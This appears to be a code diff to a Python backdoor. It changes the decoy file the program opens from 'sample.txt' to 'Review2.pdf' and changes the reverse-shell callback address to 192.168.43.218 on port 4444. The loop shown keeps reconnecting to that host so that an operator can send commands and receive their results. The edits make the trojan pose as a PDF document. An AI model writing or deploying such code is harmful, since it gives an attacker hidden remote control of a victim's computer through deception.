@@ -75,11 +75,11 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-file_name = sys._MEIPASS + "\sample.txt"
+file_name = sys._MEIPASS + "\Review2.pdf"
 subprocess.Popen(file_name, shell=True)
 while True:
     try:
-        my_backdoor = Backdoor("10.0.2.15", 4444)
+        my_backdoor = Backdoor("192.168.43.218", 4444)
         my_backdoor.run()
     except Exception:
         time.sleep(10)
